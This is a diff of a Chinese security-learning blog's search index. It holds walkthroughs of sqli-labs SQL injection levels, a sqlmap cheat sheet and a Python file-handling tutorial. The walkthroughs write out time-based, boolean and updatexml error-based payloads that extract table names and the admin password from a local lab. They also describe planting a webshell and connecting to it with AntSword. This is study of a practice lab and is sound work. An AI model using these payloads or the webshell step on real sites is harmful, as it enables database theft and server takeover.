+<p>Ps：此处我们可以展示一下 rand(ture)和 rand(false)的结果是不一样的。【　SQL 有一个 <strong>RAND</strong> 函数，用于产生 0 至 1 之间的随机数：】</p>
+<p><img src="/2021/01/28/sqllib-46-53/image-20210129213016978.png"></p>
+<p><img src="/2021/01/28/sqllib-46-53/image-20210129213043736.png"></p>
+<p>③利用 and，例如?sort=1 and (加 sql 语句)。 </p>
+<p>同时，sql 语句可以利用报错注入和延时注入的方式，语句我们可以很灵活的构造。 </p>
+<p><img src="/2021/01/28/sqllib-46-53/image-20210129222855448.png"></p>
+<p>布尔注入的来一个</p>
+<p><img src="/2021/01/28/sqllib-46-53/image-20210129225428694.png"></p>
+<p>延时的话我就不截图了，留个payload好了</p>
+<figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://<span class="hljs-number">127.0.0.1</span>/sqllib/Less-<span class="hljs-number">46</span>/?sort=<span class="hljs-number">1</span>%<span class="hljs-number">20</span>and%<span class="hljs-number">20</span>if(left(database(),<span class="hljs-number">1</span>)%<span class="hljs-number">3</span>E%<span class="hljs-number">27</span>s%<span class="hljs-number">27</span>,<span class="hljs-number">1</span>,sleep(<span class="hljs-number">5</span>))--+<br></code></pre></td></tr></table></figure>
+
+<p>正确直接回显，错误。。。。诶这个报错有意思</p>
+<p><img src="/2021/01/28/sqllib-46-53/image-20210129225828902.png"></p>
+<p>执行时间最大值30s还行这个错误不大影响注入</p>
+<p><img src="/2021/01/28/sqllib-46-53/image-20210129230639794.png"></p>
+<p>试一下procedure analyse 参数后注入，里面嵌入报错注入语句</p>
+<p><img src="/2021/01/28/sqllib-46-53/image-20210129230848591.png"></p>
+<p>丢个文件试试？</p>
+<p><img src="/2021/01/28/sqllib-46-53/image-20210129231458180.png"></p>
+<p>！！！！！貌似没有权限的样子，查一个权限</p>
+<p><img src="/2021/01/28/sqllib-46-53/image-20210129231832953.png"></p>
+<p>我有权限啊.jpg</p>
+<p>英语不好是我的问题，是我的问题，这个errcode：22貌似是个bug？？？</p>
+<h1 id="less47"><a href="#less47" class="headerlink" title="less47"></a>less47</h1><p>从数字型注入换成‘</p>
+<p><img src="/2021/01/28/sqllib-46-53/image-20210129234118261.png"></p>
+<p>要不再丢一次试试？</p>
+<p><img src="/2021/01/28/sqllib-46-53/image-20210129233204538.png"></p>
+<p>这波直接写面上了，去文件夹里还真没找到这个文件</p>
+<h1 id="less48"><a href="#less48" class="headerlink" title="less48"></a>less48</h1><p><img src="/2021/01/28/sqllib-46-53/image-20210129233459094.png"></p>
+<p>这关不会回显报错信息，看起来也是不成功了，其余同less46</p>
+<h1 id="less49"><a href="#less49" class="headerlink" title="less49"></a>less49</h1><p>无报错回显，其余同less47</p>
+<h1 id="less50"><a href="#less50" class="headerlink" title="less50"></a>less50</h1><p>order by stacked injection！我觉得这关的性质像less38——less45，先用；闭合前面sort查询语句，之后在写修改数据库的语句</p>
+<h1 id="less51"><a href="#less51" class="headerlink" title="less51"></a>less51</h1><p>从less50到less51也就多了个‘的区别</p>
+<h1 id="less52"><a href="#less52" class="headerlink" title="less52"></a>less52</h1><p>注入方式同less50；无报错回显</p>
+<h1 id="less53"><a href="#less53" class="headerlink" title="less53"></a>less53</h1><p>注入方式同less51；无报错回显</p>
+]]></content>
+      <tags>
+        <tag>sqli-labs</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>sqllib 54-65 以及总结</title>
+    <url>/2021/01/29/sqllib-54-65/</url>
+    <content><![CDATA[<h6 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h6><p>收拾一下，可以准备完结撒花了✿✿ヽ(°▽°)ノ✿</p>
+<h1 id="less54-57"><a href="#less54-57" class="headerlink" title="less54-57"></a>less54-57</h1><p>联合注入</p>
+<p>54：’  55： )    56：‘）  57：” </p>
+<h1 id="less58-61"><a href="#less58-61" class="headerlink" title="less58-61"></a>less58-61</h1><p>报错注入</p>
+<p>58： ’        59:              60:      “）          61：     ‘))</p>
+<h1 id="less62-65"><a href="#less62-65" class="headerlink" title="less62-65"></a>less62-65</h1><p>盲注，延时或布尔</p>
+<p>62:    ‘)             63:         ‘             64:     ))                      65:         ) </p>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p><img src="/2021/01/29/sqllib-54-65/image-20210130205942799.png"></p>
+<p><img src="/2021/01/29/sqllib-54-65/image-20210130210009236.png"></p>
+<p><img src="/2021/01/29/sqllib-54-65/image-20210130210024742.png"></p>
+<p><img src="/2021/01/29/sqllib-54-65/image-20210130210053206.png"></p>
+<p><img src="/2021/01/29/sqllib-54-65/image-20210130210104225.png"></p>
+<p><img src="/2021/01/29/sqllib-54-65/image-20210130210116012.png"></p>
+<p><img src="/2021/01/29/sqllib-54-65/image-20210130210128382.png"></p>
+<p><img src="/2021/01/29/sqllib-54-65/image-20210130210146043.png"></p>
+<p><img src="/2021/01/29/sqllib-54-65/image-20210130210203156.png"></p>
+<p><img src="/2021/01/29/sqllib-54-65/image-20210130210214906.png"></p>
+<p><img src="/2021/01/29/sqllib-54-65/image-20210130210226748.png"></p>
+<p><img src="/2021/01/29/sqllib-54-65/image-20210130210237022.png"></p>
+<p><img src="/2021/01/29/sqllib-54-65/image-20210130210250709.png"></p>
+<p><img src="/2021/01/29/sqllib-54-65/image-20210130210301656.png"></p>
+<p><img src="/2021/01/29/sqllib-54-65/image-20210130210314538.png"></p>
+<p><img src="/2021/01/29/sqllib-54-65/image-20210130210340612.png"></p>
+<p><img src="/2021/01/29/sqllib-54-65/image-20210130210350642.png"></p>
+<p><img src="/2021/01/29/sqllib-54-65/image-20210130210413929.png"></p>
+<p>完结，撒花✿✿ヽ(°▽°)ノ✿</p>
+]]></content>
+      <tags>
+        <tag>sqli-labs</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>sqllib 7-10</title>
+    <url>/2021/01/15/sqllib-7-10/</url>
+    <content><![CDATA[<p>其实less5、less6打了差不多的话这边其实过起来蛮快的，时间隔太长了，再打一次当复习了。</p>
+<h2 id="less7"><a href="#less7" class="headerlink" title="less7"></a>less7</h2><p>7的位置其实我觉得略微尴尬，和前后关卡关系不大</p>
+<p><img src="/2021/01/15/sqllib-7-10/image-20210121145750495.png"><span class="image-caption">image-20210121145750495</span></p>
+<p>通过order by来确定字段数</p>
+<p><img src="/2021/01/15/sqllib-7-10/image-20210121150316810.png"><span class="image-caption">image-20210121150316810</span></p>
+<p>绝对路径不对什么也没有获得到，之前改过的配置文件现在不见了，简直离奇</p>
+<p><img src="/2021/01/15/sqllib-7-10/image-20210121155144911.png"><span class="image-caption">image-20210121155144911</span></p>
+<p>mysql命令行查询，果然有问题，还得再手动设置一次</p>
+<p>在my.ini中添加<img src="/2021/01/15/sqllib-7-10/image-20210121155527594.png"><span class="image-caption">image-20210121155527594</span></p>
+<p>查的时候是说直接=就行，但是在我这里不太行，就加了个“/”,<img src="/2021/01/15/sqllib-7-10/image-20210121155652236.png"><span class="image-caption">image-20210121155652236</span></p>
+<p>导出成功</p>
+<p><img src="/2021/01/15/sqllib-7-10/image-20210121155745775.png"><span class="image-caption">image-20210121155745775</span></p>
+<h3 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h3><p>同前面几关，<img src="/2021/01/15/sqllib-7-10/image-20210121160549183.png"><span class="image-caption">image-20210121160549183</span></p>
+<p>输入查询数据，在导出的文件中获取信息</p>
+<p><img src="/2021/01/15/sqllib-7-10/image-20210121161015528.png"><span class="image-caption">image-20210121161015528</span></p>
+<p><img src="/2021/01/15/sqllib-7-10/image-20210121161424249.png"><span class="image-caption">image-20210121161424249</span></p>
+<p><img src="/2021/01/15/sqllib-7-10/image-20210121161441899.png"><span class="image-caption">image-20210121161441899</span></p>
+<p>因为查询语句中没有限制是哪个数据库，所以显示出来的结果就不太一样</p>
+<p><img src="/2021/01/15/sqllib-7-10/image-20210121162627151.png"><span class="image-caption">image-20210121162627151</span></p>
+<p><img src="/2021/01/15/sqllib-7-10/image-20210121162618357.png"><span class="image-caption">image-20210121162618357</span></p>
+<h3 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h3><p>使用蚁剑控制木马实现爆破</p>
+<p><img src="/2021/01/15/sqllib-7-10/image-20210122125351241.png"><span class="image-caption">image-20210122125351241</span></p>
+<p>先扔个木马进去</p>
+<p>用蚁剑连接</p>
+<p>密码即为mmye</p>
+<p><img src="/2021/01/15/sqllib-7-10/image-20210122130151941.png"><span class="image-caption">image-20210122130151941</span></p>
+<p>至于剩下的嘛，给你一个眼神自己体会</p>
+<h2 id="less8"><a href="#less8" class="headerlink" title="less8"></a>less8</h2><p>这边不允许了报错注入，可以尝试一下布尔盲注和延时盲注</p>
+<p><img src="/2021/01/15/sqllib-7-10/image-20210115203729692.png"></p>
+<p><img src="/2021/01/15/sqllib-7-10/image-20210115204614669.png"></p>
+<p><img src="/2021/01/15/sqllib-7-10/image-20210115204722930.png"></p>
+<p><img src="/2021/01/15/sqllib-7-10/image-20210122133953208.png"><span class="image-caption">image-20210122133953208</span></p>
+<p><img src="/2021/01/15/sqllib-7-10/image-20210122134114338.png"><span class="image-caption">image-20210122134114338</span></p>
+<p>那就慢慢的猜下去</p>
+<p><img src="/2021/01/15/sqllib-7-10/image-20210122134152534.png"><span class="image-caption">image-20210122134152534</span></p>
+<p>以此继续推出column，然后在推出username和password</p>
+<h2 id="less9、10"><a href="#less9、10" class="headerlink" title="less9、10"></a>less9、10</h2><h3 id="less9"><a href="#less9" class="headerlink" title="less9"></a>less9</h3><p>标题说了时间盲注单引号</p>
+<p>那么就</p>
+<p><a href="http://127.0.0.1/sqllib/Less-9/?id=1&#39;">http://127.0.0.1/sqllib/Less-9/?id=1&#39;</a> and if(substr(database(),8,1)=’security’,1,sleep(5)) –+</p>
+<p><a href="http://127.0.0.1/sqllib/Less-9/?id=1&#39;and">http://127.0.0.1/sqllib/Less-9/?id=1&#39;and</a> If(ascii(substr((select table_name from information_schema.tables where table_schema=’security’ limit 0,1),1,1))=101,1,sleep(5))–+</p>
+<p><a href="http://127.0.0.1/sqllib/Less-9/?id=1&#39;and">http://127.0.0.1/sqllib/Less-9/?id=1&#39;and</a> If(ascii(substr((select column_name from information_schema.columns where table_name=’users’ limit 0,1),1,1))=105,1,sleep(5))–+</p>
+<p><a href="http://127.0.0.1/sqllib/Less-9/?id=1&#39;and">http://127.0.0.1/sqllib/Less-9/?id=1&#39;and</a> If(ascii(substr((select username from users limit 0,1),1,1))=68,1,sleep(5))–+</p>
+<h3 id="less10"><a href="#less10" class="headerlink" title="less10"></a>less10</h3><p>也就是在less9 基础上将单引号改成双引号</p>
+<p>这两关在正确时直接回显，错误时进行延时加载</p>
+]]></content>
+      <tags>
+        <tag>sqli-labs</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>sqlmap的使用常见语句</title>
+    <url>/2021/01/28/sqlmap%E7%9A%84%E4%BD%BF%E7%94%A8%E5%B8%B8%E8%A7%81%E8%AF%AD%E5%8F%A5/</url>
+    <content><![CDATA[<p>#&gt;  ./sqlmap.py -u “注入地址” -v 1 –dbs  // 列举数据库 </p>
+<p>#&gt; ./sqlmap.py -u “注入地址” -v 1 –current-db  // 当前数据库</p>
+<p>#&gt;./sqlmap.py -u “注入地址” -v 1 –users   // 列数据库用户</p>
+<p>#&gt;  ./sqlmap.py -u “注入地址” -v 1 –current-user  // 当前用户</p>
+<p>#&gt;  ./sqlmap.py -u “注入地址” -v 1 –tables -D “数据库”  // 列举数据库的表名</p>
+<p>#&gt; ./sqlmap.py -u “注入地址” -v 1 –columns -T “表名” -D “数据库”  // 获取表的列名</p>
+<p>#&gt;./sqlmap.py -u “注入地址” -v 1 –dump -C “字段,字段” -T “表名” -D “数据库”  // 获取表中的数据，包含列 </p>
+]]></content>
+      <tags>
+        <tag>sql工具</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>sqllib 17</title>
+    <url>/2021/01/23/%E2%80%98sqllib-17/</url>
+    <content><![CDATA[<p><img src="/2021/01/23/%E2%80%98sqllib-17/image-20210124144231845.png"></p>
+<p>思路大体不变，这边使用报错注入就对了，然后爆破数据库，数据表，数据列，数据，</p>
+<p>对这边是在password中开始注入，username被处理了，在之前的关卡中在username和password中都是可以进行注入的，具体来看看源代码</p>
+<p><img src="/2021/01/23/%E2%80%98sqllib-17/image-20210124202305451.png"></p>
+<p><img src="/2021/01/23/%E2%80%98sqllib-17/image-20210124202334193.png"></p>
+<p><img src="/2021/01/23/%E2%80%98sqllib-17/image-20210124144709315.png"></p>
+<p>出了一点点意外，这个只能返回一行，并且updatexml函数只能截取32位的数据，那看来要对查询语句进行限制</p>
+<p>刚才的语句为</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql">1&#x27; and updatexml(1,concat(0x7e,(<span class="hljs-keyword">select</span> table_name <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema=<span class="hljs-string">&#x27;security&#x27;</span>),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>)<span class="hljs-comment">#</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/2021/01/23/%E2%80%98sqllib-17/image-20210124145032248.png"></p>
+<p>现在的语句是</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql">1&#x27; and updatexml(1,concat(0x7e,(<span class="hljs-keyword">select</span> table_name <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema=<span class="hljs-string">&#x27;security&#x27;</span> <span class="hljs-keyword">limit</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span>),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>)<span class="hljs-comment">#</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/2021/01/23/%E2%80%98sqllib-17/image-20210124145938668.png"></p>
+<p>没想到啊，这边还有操作，百度搜了一下，看来我需要套个娃</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql">1&#x27; and updatexml(1,concat(0x7e,(<span class="hljs-keyword">select</span> username <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> table_name <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema=<span class="hljs-string">&#x27;security&#x27;</span> <span class="hljs-keyword">limit</span> <span class="hljs-number">3</span>,<span class="hljs-number">1</span>), <span class="hljs-keyword">where</span> table_schema=<span class="hljs-string">&#x27;security&#x27;</span> <span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>)<span class="hljs-comment">#</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/2021/01/23/%E2%80%98sqllib-17/image-20210124150339099.png"> </p>
+<p>还是不太行，对需要别名</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql">1&#x27; and updatexml(1,concat(0x7e,(<span class="hljs-keyword">select</span> username <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> table_name <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema=<span class="hljs-string">&#x27;security&#x27;</span> <span class="hljs-keyword">limit</span> <span class="hljs-number">3</span>,<span class="hljs-number">1</span>)aa), <span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>)<span class="hljs-comment">#</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/2021/01/23/%E2%80%98sqllib-17/image-20210124193458237.png">不是常量，绕过失败</p>
+<p>上网搜了一下dalao的解法</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql">1&#x27; and (updatexml(1,concat(0x5c,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">password</span> <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> <span class="hljs-keyword">password</span> <span class="hljs-keyword">from</span> <span class="hljs-keyword">users</span> <span class="hljs-keyword">where</span> username=<span class="hljs-string">&#x27;admin&#x27;</span>)aa),<span class="hljs-number">0x5c</span>),<span class="hljs-number">1</span>))<span class="hljs-comment">#</span><br></code></pre></td></tr></table></figure>
+
+<p>这边是知道了username去查询password，where username=’admin’可更换为limit 进行查询</p>
 ]]></content>
       <tags>
         <tag>sqli-labs</tag>
@@ -1963,37 +2006,6 @@
       </tags>
   </entry>
   <entry>
-    <title>“Python 文件操作</title>
-    <url>/2020/10/16/%E2%80%9Cpython-%E6%96%87%E4%BB%B6/</url>
-    <content><![CDATA[<h2 id="打开一个txt文件"><a href="#打开一个txt文件" class="headerlink" title="打开一个txt文件"></a>打开一个txt文件</h2><p>先新建一个文件夹，在其中新建一个空的Python文件</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python">file = open(<span class="hljs-string">&#x27;test.txt&#x27;</span>,<span class="hljs-string">&#x27;w&#x27;</span>) <span class="hljs-comment">#w为打开文件的模式，只用于写入。若文件存在则打开文件并清空原有内容，若不存在则创建新文件。</span><br></code></pre></td></tr></table></figure>
-
-<p>此时在文件夹中即可见一个名为test的txt文件</p>
-<h2 id="查看文件属性"><a href="#查看文件属性" class="headerlink" title="查看文件属性"></a>查看文件属性</h2><h3 id="查看方法"><a href="#查看方法" class="headerlink" title="查看方法"></a>查看方法</h3><figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python">file = open(<span class="hljs-string">&#x27;test.txt&#x27;</span>,<span class="hljs-string">&#x27;w&#x27;</span>)<br><br>print(<span class="hljs-string">&#x27;文件名称;&#x27;</span>,file.name)<br>print(<span class="hljs-string">&#x27;文件是否关闭：&#x27;</span>,file.closed)<br>print(<span class="hljs-string">&#x27;文件访问模式：&#x27;</span>,file.mode)<br></code></pre></td></tr></table></figure>
-
-<h3 id="输出结果"><a href="#输出结果" class="headerlink" title="输出结果"></a>输出结果</h3><figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python">文件名称; test.txt<br>文件是否关闭： <span class="hljs-literal">False</span><br>文件访问模式： w<br></code></pre></td></tr></table></figure>
-
-<h2 id="关闭一个txt文件"><a href="#关闭一个txt文件" class="headerlink" title="关闭一个txt文件"></a>关闭一个txt文件</h2><figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python">file = open(<span class="hljs-string">&#x27;test.txt&#x27;</span>,<span class="hljs-string">&#x27;w&#x27;</span>)<br><br>file.close()<br>print(<span class="hljs-string">&#x27;文件是否关闭：&#x27;</span>,file.closed)<br><br><span class="hljs-comment">#显示结果：文件是否关闭： True</span><br></code></pre></td></tr></table></figure>
-
-<h2 id="文件路径"><a href="#文件路径" class="headerlink" title="文件路径"></a>文件路径</h2><p>如果要打开的文件在另外的目录里，那么</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python">file = open(<span class="hljs-string">&quot;D:\\111\\test.txt&quot;</span>,<span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-comment">#r表示只读文件，不能写文件；\\可用/代替</span><br></code></pre></td></tr></table></figure>
-
-<p>或者</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python">file = open(<span class="hljs-string">r&#x27;D:\111\test.txt&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-comment">#加上r的目的是不让反斜杠转义</span><br></code></pre></td></tr></table></figure>
-
-<h2 id="文件读取"><a href="#文件读取" class="headerlink" title="文件读取"></a>文件读取</h2><figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python">file = open(<span class="hljs-string">&quot;D:\\111\\test.txt&quot;</span>,<span class="hljs-string">&#x27;r&#x27;</span>)<br>s=file.read()<br>print(<span class="hljs-string">&#x27;文件内容是：\n&#x27;</span>,s)<br><br>文件内容是：<br> <span class="hljs-number">123456789</span><br></code></pre></td></tr></table></figure>
-
-<h2 id="写入文件"><a href="#写入文件" class="headerlink" title="写入文件"></a>写入文件</h2><figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python">f = open(<span class="hljs-string">&quot;D:\\111\\test.txt&quot;</span>,<span class="hljs-string">&#x27;w&#x27;</span>)<br>f.write(<span class="hljs-string">&quot;123456789&quot;</span>) <span class="hljs-comment">#写入文件</span><br>f.close <span class="hljs-comment">#关闭文件</span><br></code></pre></td></tr></table></figure>
-
-<h2 id="修改文件名、删除文件"><a href="#修改文件名、删除文件" class="headerlink" title="修改文件名、删除文件"></a>修改文件名、删除文件</h2><figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os<br><span class="hljs-comment">#rename(&quot;原来的文件名&quot;,&quot;要修改的名字&quot;)</span><br>os.rename(<span class="hljs-string">&quot;test.txt&quot;</span>,<span class="hljs-string">&quot;t.txt&quot;</span>)<br><span class="hljs-comment">#remove(&quot;已修改的文件名&quot;) 删除文件</span><br>os.remove(<span class="hljs-string">&quot;t.txt&quot;</span>)<br><br></code></pre></td></tr></table></figure>
-
-<p>若不在同一目录，则在原文件名前加上路径</p>
-]]></content>
-      <tags>
-        <tag>Python</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>bugku web 1-12</title>
     <url>/2021/01/15/%E2%80%98ugku-web-1-n/</url>
     <content><![CDATA[<p>前面几题基本上看看评论就知道怎么操作了，受到了第八题的影响，第九题确实极具迷惑性。</p>
@@ -2033,38 +2045,34 @@
       </tags>
   </entry>
   <entry>
-    <title>sqllib 17</title>
-    <url>/2021/01/23/%E2%80%98sqllib-17/</url>
-    <content><![CDATA[<p><img src="/2021/01/23/%E2%80%98sqllib-17/image-20210124144231845.png"></p>
-<p>思路大体不变，这边使用报错注入就对了，然后爆破数据库，数据表，数据列，数据，</p>
-<p>对这边是在password中开始注入，username被处理了，在之前的关卡中在username和password中都是可以进行注入的，具体来看看源代码</p>
-<p><img src="/2021/01/23/%E2%80%98sqllib-17/image-20210124202305451.png"></p>
-<p><img src="/2021/01/23/%E2%80%98sqllib-17/image-20210124202334193.png"></p>
-<p><img src="/2021/01/23/%E2%80%98sqllib-17/image-20210124144709315.png"></p>
-<p>出了一点点意外，这个只能返回一行，并且updatexml函数只能截取32位的数据，那看来要对查询语句进行限制</p>
-<p>刚才的语句为</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql">1&#x27; and updatexml(1,concat(0x7e,(<span class="hljs-keyword">select</span> table_name <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema=<span class="hljs-string">&#x27;security&#x27;</span>),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>)<span class="hljs-comment">#</span><br></code></pre></td></tr></table></figure>
+    <title>“Python 文件操作</title>
+    <url>/2020/10/16/%E2%80%9Cpython-%E6%96%87%E4%BB%B6/</url>
+    <content><![CDATA[<h2 id="打开一个txt文件"><a href="#打开一个txt文件" class="headerlink" title="打开一个txt文件"></a>打开一个txt文件</h2><p>先新建一个文件夹，在其中新建一个空的Python文件</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python">file = open(<span class="hljs-string">&#x27;test.txt&#x27;</span>,<span class="hljs-string">&#x27;w&#x27;</span>) <span class="hljs-comment">#w为打开文件的模式，只用于写入。若文件存在则打开文件并清空原有内容，若不存在则创建新文件。</span><br></code></pre></td></tr></table></figure>
 
-<p><img src="/2021/01/23/%E2%80%98sqllib-17/image-20210124145032248.png"></p>
-<p>现在的语句是</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql">1&#x27; and updatexml(1,concat(0x7e,(<span class="hljs-keyword">select</span> table_name <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema=<span class="hljs-string">&#x27;security&#x27;</span> <span class="hljs-keyword">limit</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span>),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>)<span class="hljs-comment">#</span><br></code></pre></td></tr></table></figure>
+<p>此时在文件夹中即可见一个名为test的txt文件</p>
+<h2 id="查看文件属性"><a href="#查看文件属性" class="headerlink" title="查看文件属性"></a>查看文件属性</h2><h3 id="查看方法"><a href="#查看方法" class="headerlink" title="查看方法"></a>查看方法</h3><figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python">file = open(<span class="hljs-string">&#x27;test.txt&#x27;</span>,<span class="hljs-string">&#x27;w&#x27;</span>)<br><br>print(<span class="hljs-string">&#x27;文件名称;&#x27;</span>,file.name)<br>print(<span class="hljs-string">&#x27;文件是否关闭：&#x27;</span>,file.closed)<br>print(<span class="hljs-string">&#x27;文件访问模式：&#x27;</span>,file.mode)<br></code></pre></td></tr></table></figure>
 
-<p><img src="/2021/01/23/%E2%80%98sqllib-17/image-20210124145938668.png"></p>
-<p>没想到啊，这边还有操作，百度搜了一下，看来我需要套个娃</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql">1&#x27; and updatexml(1,concat(0x7e,(<span class="hljs-keyword">select</span> username <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> table_name <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema=<span class="hljs-string">&#x27;security&#x27;</span> <span class="hljs-keyword">limit</span> <span class="hljs-number">3</span>,<span class="hljs-number">1</span>), <span class="hljs-keyword">where</span> table_schema=<span class="hljs-string">&#x27;security&#x27;</span> <span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>)<span class="hljs-comment">#</span><br></code></pre></td></tr></table></figure>
+<h3 id="输出结果"><a href="#输出结果" class="headerlink" title="输出结果"></a>输出结果</h3><figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python">文件名称; test.txt<br>文件是否关闭： <span class="hljs-literal">False</span><br>文件访问模式： w<br></code></pre></td></tr></table></figure>
 
-<p><img src="/2021/01/23/%E2%80%98sqllib-17/image-20210124150339099.png"> </p>
-<p>还是不太行，对需要别名</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql">1&#x27; and updatexml(1,concat(0x7e,(<span class="hljs-keyword">select</span> username <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> table_name <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema=<span class="hljs-string">&#x27;security&#x27;</span> <span class="hljs-keyword">limit</span> <span class="hljs-number">3</span>,<span class="hljs-number">1</span>)aa), <span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>)<span class="hljs-comment">#</span><br></code></pre></td></tr></table></figure>
+<h2 id="关闭一个txt文件"><a href="#关闭一个txt文件" class="headerlink" title="关闭一个txt文件"></a>关闭一个txt文件</h2><figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python">file = open(<span class="hljs-string">&#x27;test.txt&#x27;</span>,<span class="hljs-string">&#x27;w&#x27;</span>)<br><br>file.close()<br>print(<span class="hljs-string">&#x27;文件是否关闭：&#x27;</span>,file.closed)<br><br><span class="hljs-comment">#显示结果：文件是否关闭： True</span><br></code></pre></td></tr></table></figure>
 
-<p><img src="/2021/01/23/%E2%80%98sqllib-17/image-20210124193458237.png">不是常量，绕过失败</p>
-<p>上网搜了一下dalao的解法</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql">1&#x27; and (updatexml(1,concat(0x5c,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">password</span> <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> <span class="hljs-keyword">password</span> <span class="hljs-keyword">from</span> <span class="hljs-keyword">users</span> <span class="hljs-keyword">where</span> username=<span class="hljs-string">&#x27;admin&#x27;</span>)aa),<span class="hljs-number">0x5c</span>),<span class="hljs-number">1</span>))<span class="hljs-comment">#</span><br></code></pre></td></tr></table></figure>
+<h2 id="文件路径"><a href="#文件路径" class="headerlink" title="文件路径"></a>文件路径</h2><p>如果要打开的文件在另外的目录里，那么</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python">file = open(<span class="hljs-string">&quot;D:\\111\\test.txt&quot;</span>,<span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-comment">#r表示只读文件，不能写文件；\\可用/代替</span><br></code></pre></td></tr></table></figure>
 
-<p>这边是知道了username去查询password，where username=’admin’可更换为limit 进行查询</p>
+<p>或者</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python">file = open(<span class="hljs-string">r&#x27;D:\111\test.txt&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-comment">#加上r的目的是不让反斜杠转义</span><br></code></pre></td></tr></table></figure>
+
+<h2 id="文件读取"><a href="#文件读取" class="headerlink" title="文件读取"></a>文件读取</h2><figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python">file = open(<span class="hljs-string">&quot;D:\\111\\test.txt&quot;</span>,<span class="hljs-string">&#x27;r&#x27;</span>)<br>s=file.read()<br>print(<span class="hljs-string">&#x27;文件内容是：\n&#x27;</span>,s)<br><br>文件内容是：<br> <span class="hljs-number">123456789</span><br></code></pre></td></tr></table></figure>
+
+<h2 id="写入文件"><a href="#写入文件" class="headerlink" title="写入文件"></a>写入文件</h2><figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python">f = open(<span class="hljs-string">&quot;D:\\111\\test.txt&quot;</span>,<span class="hljs-string">&#x27;w&#x27;</span>)<br>f.write(<span class="hljs-string">&quot;123456789&quot;</span>) <span class="hljs-comment">#写入文件</span><br>f.close <span class="hljs-comment">#关闭文件</span><br></code></pre></td></tr></table></figure>
+
